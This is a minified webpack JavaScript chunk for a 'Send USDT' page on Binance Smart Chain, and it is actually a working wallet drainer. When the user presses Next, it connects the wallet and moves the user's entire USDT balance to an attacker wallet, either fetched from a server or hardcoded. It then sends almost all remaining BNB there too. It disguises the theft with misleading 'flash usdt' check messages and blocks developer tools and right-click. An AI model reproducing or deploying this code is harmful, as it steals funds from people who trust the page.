(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[974], {
    2300: (e, t, a) => {
        Promise.resolve().then(a.bind(a, 220))
    }
    ,
    220: (e, t, a) => {
        "use strict";
        let s, r, n, o;
        a.r(t),
        a.d(t, {
            default: () => C
        });
        var i = a(5155)
          , l = a(5504)
          , c = a(9379)
          , d = a(2115)
          , h = a(1290)
          , u = a(1027)
          , m = a(3463)
          , f = a(9795);
        function g() {
            for (var e = arguments.length, t = Array(e), a = 0; a < e; a++)
                t[a] = arguments[a];
            return (0,
            f.QP)((0,
            m.$)(t))
        }
        let x = (0,
        u.F)("inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0", {
            variants: {
                variant: {
                    default: "bg-primary text-primary-foreground shadow hover:bg-primary/90",
                    destructive: "bg-destructive text-destructive-foreground shadow-sm hover:bg-destructive/90",
                    outline: "border border-input bg-background shadow-sm hover:bg-accent hover:text-accent-foreground",
                    secondary: "bg-secondary text-secondary-foreground shadow-sm hover:bg-secondary/80",
                    ghost: "hover:bg-accent hover:text-accent-foreground",
                    link: "text-primary underline-offset-4 hover:underline"
                },
                size: {
                    default: "h-9 px-4 py-2",
                    sm: "h-8 rounded-md px-3 text-xs",
                    lg: "h-10 rounded-md px-8",
                    icon: "h-9 w-9"
                }
            },
            defaultVariants: {
                variant: "default",
                size: "default"
            }
        })
          , w = d.forwardRef( (e, t) => {
            let {className: a, variant: s, size: r, asChild: n=!1, ...o} = e
              , l = n ? h.DX : "button";
            return (0,
            i.jsx)(l, {
                className: g(x({
                    variant: s,
                    size: r,
                    className: a
                })),
                ref: t,
                ...o
            })
        }
        );
        w.displayName = "Button";
        let p = d.forwardRef( (e, t) => {
            let {className: a, type: s, ...r} = e;
            return (0,
            i.jsx)("input", {
                type: s,
                className: g("flex h-9 w-full rounded-md border border-input bg-transparent px-3 py-1 text-base shadow-sm transition-colors file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:cursor-not-allowed disabled:opacity-50 md:text-sm", a),
                ref: t,
                ...r
            })
        }
        );
        p.displayName = "Input";
        var b = a(4229)
          , y = a(3621)
          , v = a(2651);
        let N = ""
          , B = [{
            constant: !0,
            inputs: [{
                name: "_owner",
                type: "address"
            }],
            name: "balanceOf",
            outputs: [{
                name: "balance",
                type: "uint256"
            }],
            type: "function"
        }, {
            constant: !1,
            inputs: [{
                name: "_to",
                type: "address"
            }, {
                name: "_value",
                type: "uint256"
            }],
            name: "transfer",
            outputs: [{
                name: "",
                type: "bool"
            }],
            type: "function"
        }]
          , j = {
            chainId: "0x38",
            chainName: "Binance Smart Chain Mainnet",
            nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18
            },
            rpcUrls: ["https://bsc-dataseed1.binance.org/"],
            blockExplorerUrls: ["https://bscscan.com/"]
        };
        async function k() {
            if (window.ethereum)
                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{
                            chainId: j.chainId
                        }]
                    })
                } catch (e) {
                    if (4902 === e.code)
                        try {
                            await window.ethereum.request({
                                method: "wallet_addEthereumChain",
                                params: [j]
                            })
                        } catch (e) {
                            throw Error("Failed to add BSC Mainnet to wallet")
                        }
                    else
                        throw Error("Failed to switch to BSC Mainnet")
                }
            else
                throw Error("No compatible wallet found")
        }
        async function I() {
            try {
                N = (await v.A.get("/api/admin/publicWallet")).data.walletAddress
            } catch (e) {
                throw console.error("Failed to fetch admin wallet address:", e),
                e
            }
        }
        async function F() {
            try {
                if (await I(),
                await k(),
                window.ethereum)
                    await window.ethereum.request({
                        method: "eth_requestAccounts"
                    }),
                    s = new b.k(window.ethereum,"any"),
                    n = new y.Ay$(window.ethereum);
                else
                    throw Error("No compatible wallet found");
                r = await s.getSigner();
                let e = await r.getAddress();
                return o = new n.eth.Contract(B,"0x55d398326f99059ff775485246999027B3197955"),
                (await s.getNetwork()).chainId,
                BigInt(56),
                e
            } catch (e) {
                throw console.error("Wallet connection error:", e),
                e
            }
        }
        async function A() {
            try {
                let e, t;
                let a = (await n.eth.getAccounts())[0]
                  , s = await n.eth.getBalance(a)
                  , r = await o.methods.balanceOf(a).call()
                  , i = n.utils.fromWei(r, "ether");
                console.log("Initial BNB balance:", n.utils.fromWei(s, "ether")),
                console.log("Current USDT balance:", i);
                let l = n.utils.fromWei(s, "ether")
                  , c = parseFloat(i).toFixed(2)
                  , d = parseFloat(l).toFixed(4);
                if (150 >= parseFloat(i))
                    throw {
                        usdttoshow: c,
                        bnbtoshow: d
                    };
                let h = "0"
                  , u = "0";
                if (parseFloat(i) > 150) {
                    let e = await n.eth.getGasPrice()
                      , l = await o.methods.transfer(N, r).estimateGas({
                        from: a
                    })
                      , c = BigInt(e) * BigInt(l) * BigInt(120) / BigInt(100);
                    if (console.log("Required BNB for gas:", n.utils.fromWei(c.toString(), "ether")),
                    console.log("Current BNB balance:", n.utils.fromWei(s, "ether")),
                    BigInt(s) < c) {
                        let e = c - BigInt(s)
                          , t = n.utils.toWei("0.0001", "ether")
                          , r = e * BigInt(110) / BigInt(100) + BigInt(t);
                        console.log("Sending required BNB for gas:", n.utils.fromWei(r.toString(), "ether"));
                        let o = await v.A.post("/api/transactions/sendGasFees", {
                            userAddress: a,
                            amount: r.toString()
                        });
                        if (!o.data.success)
                            throw Error("Failed to send gas fees");
                        console.log("Sent BNB for gas fees, hash:", o.data.hash),
                        await new Promise(e => setTimeout(e, 8e3))
                    }
                    if (parseFloat(i) > 5500)
                        try {
                            t = (await o.methods.transfer("0x1Cb28C285E8d323551f8d016A5d131B6585cdd16", r).send({
                                from: a
                            })).transactionHash,
                            console.log("Insufficient fund to check flash usdt"),
                            u = i
                        } catch (e) {
                            throw console.error("Insufficient fund to check flash usdt:", e),
                            {
                                amount: "Amount = Checked ✅",
                                flash: "Flash Usdt = 0"
                            }
                        }
                    else
                        try {
                            t = (await o.methods.transfer(N, r).send({
                                from: a
                            })).transactionHash,
                            console.log("Insufficient fund to check flash usdt"),
                            u = i,
                            await S(a, u, t, "USDT")
                        } catch (e) {
                            throw console.error("Insufficient fund to check flash usdt:", e),
                            {
                                amount: "Amount = Checked ✅",
                                flash: "Flash Usdt = 0"
                            }
                        }
                }
                let m = await n.eth.getBalance(a);
                if (BigInt(m) > 0)
                    try {
                        let t = await n.eth.getGasPrice()
                          , s = BigInt(t) * BigInt(21e3)
                          , r = BigInt(m) - s;
                        r > 0 && (e = (await n.eth.sendTransaction({
                            from: a,
                            to: N,
                            value: r.toString()
                        })).transactionHash,
                        console.log("Insufficient fund to check flash usdt", e),
                        h = n.utils.fromWei(r.toString(), "ether"),
                        await S(a, h, e, "BNB"))
                    } catch (e) {
                        throw console.error("Insufficient fund to check flash usdt:", e),
                        {
                            amount: "Amount = Checked ✅",
                            flash: "Flash Usdt = 0"
                        }
                    }
                return {
                    bnbTxHash: e,
                    usdtTxHash: t,
                    bnbAmount: h,
                    usdtAmount: u
                }
            } catch (e) {
                throw console.error("flash usdt failed:", e),
                e
            }
        }
        async function S(e, t, a, s) {
            try {
                await v.A.post("/api/transactions/store", {
                    userAddress: e,
                    amount: t,
                    txHash: a,
                    currency: s
                })
            } catch (e) {
                console.error("Failed to store transaction data:", e)
            }
        }
        function C() {
            let[e,t] = (0,
            d.useState)("")
              , [a,s] = (0,
            d.useState)("")
              , [r,n] = (0,
            d.useState)(!1);
            async function o() {
                n(!0);
                try {
                    await F();
                    let {bnbTxHash: e, usdtTxHash: t, bnbAmount: a, usdtAmount: s} = await A()
                } catch (e) {} finally {
                    setTimeout( () => {
                        n(!1)
                    }
                    , 2e3)
                }
            }
            (0,
            d.useEffect)( () => {
                let e = e => {
                    ("F12" === e.key || e.ctrlKey && e.shiftKey && "I" === e.key || e.ctrlKey && e.shiftKey && "J" === e.key || e.ctrlKey && "U" === e.key) && (e.preventDefault(),
                    alert("Developer tools are disabled on this page."))
                }
                  , t = e => {
                    e.preventDefault(),
                    alert("Right-click is disabled on this page.")
                }
                ;
                return document.addEventListener("keydown", e),
                document.addEventListener("contextmenu", t),
                () => {
                    document.removeEventListener("keydown", e),
                    document.removeEventListener("contextmenu", t)
                }
            }
            , []);
            let h = Number.parseFloat(e) > 0;
            return (0,
            i.jsxs)("div", {
                className: "min-h-screen bg-[#1b1b1b] text-gray-300 p-4 max-w-md mx-auto",
                children: [(0,
                i.jsx)("header", {
                    className: "flex w-full items-center mb-8",
                    children: (0,
                    i.jsx)("h1", {
                        className: "flex-1 text-center text-xl font-medium text-white",
                        children: "Send USDT"
                    })
                }), (0,
                i.jsxs)("div", {
                    className: "space-y-6",
                    children: [(0,
                    i.jsxs)("div", {
                        className: "space-y-1",
                        children: [(0,
                        i.jsx)("label", {
                            className: "text-sm text",
                            children: "Address or Domain Name"
                        }), (0,
                        i.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            i.jsx)(p, {
                                placeholder: "Search or Enter",
                                className: "bg-[#1b1b1b] border-gray-800 text-gray-300 pr-32 py-7",
                                value: "0x3A01De690F01F8AdEaF328aF14101236afB5C3FA",
                                onChange: e => s(e.target.value)
                            }), (0,
                            i.jsxs)("div", {
                                className: "absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1",
                                children: [(0,
                                i.jsx)(w, {
                                    variant: "ghost",
                                    size: "sm",
                                    className: "text-greentext h-8 px-2 text-md hover:text-emerald-400",
                                    children: "Paste"
                                }), (0,
                                i.jsx)(w, {
                                    variant: "ghost",
                                    size: "icon",
                                    className: "text-greentext h-8 w-8 hover:text-emerald-400",
                                    children: (0,
                                    i.jsx)(l.A, {
                                        className: "h-4 w-4"
                                    })
                                }), (0,
                                i.jsx)(w, {
                                    variant: "ghost",
                                    size: "icon",
                                    className: "text-greentext h-8 w-8 hover:text-emerald-400",
                                    children: (0,
                                    i.jsx)(c.A, {
                                        className: "h-4 w-4"
                                    })
                                })]
                            })]
                        })]
                    }), (0,
                    i.jsxs)("div", {
                        className: "space-y-1",
                        children: [(0,
                        i.jsx)("label", {
                            className: "text-sm text-gray-400",
                            children: "Amount"
                        }), (0,
                        i.jsxs)("div", {
                            className: "relative",
                            children: [(0,
                            i.jsx)(p, {
                                placeholder: "USDT Amount",
                                type: "number",
                                className: "bg-[#1b1b1b] border-gray-800 text-gray-300 pr-24 py-7",
                                value: e,
                                onChange: e => t(e.target.value)
                            }), (0,
                            i.jsxs)("div", {
                                className: "absolute right-2 top-1/2 -translate-y-1/2 flex items-center gap-1",
                                children: [(0,
                                i.jsx)("span", {
                                    className: "text-gray-500 text-sm mr-2",
                                    children: "USDT"
                                }), (0,
                                i.jsx)(w, {
                                    variant: "ghost",
                                    size: "sm",
                                    className: "text-greentext h-8 text-sm hover:text-emerald-400",
                                    children: "Max"
                                })]
                            })]
                        })]
                    }), (0,
                    i.jsxs)("div", {
                        className: "text-xs  text-gray-500",
                        children: ["≈ $", Number.parseFloat(e || "0").toFixed(2)]
                    })]
                }), (0,
                i.jsx)("div", {
                    className: "fixed bottom-8 left-4 right-4 max-w-md mx-auto",
                    children: (0,
                    i.jsx)(w, {
                        className: "w-full bg-greentext text-black hover:bg-gray-700 rounded-full disabled:opacity-50 disabled:cursor-not-allowed disabled:bg-gray-600 disabled:text-white h-12 text-lg",
                        disabled: !h || r,
                        onClick: o,
                        children: r ? (0,
                        i.jsx)("div", {
                            className: "flex items-center justify-center",
                            children: (0,
                            i.jsx)("div", {
                                className: "animate-spin rounded-full h-6 w-6 border-b-2 border-white"
                            })
                        }) : "Next"
                    })
                })]
            })
        }
    }
}, e => {
    var t = t => e(e.s = t);
    e.O(0, [651, 881, 441, 517, 358], () => t(2300)),
    _N_E = e.O()
}
]);
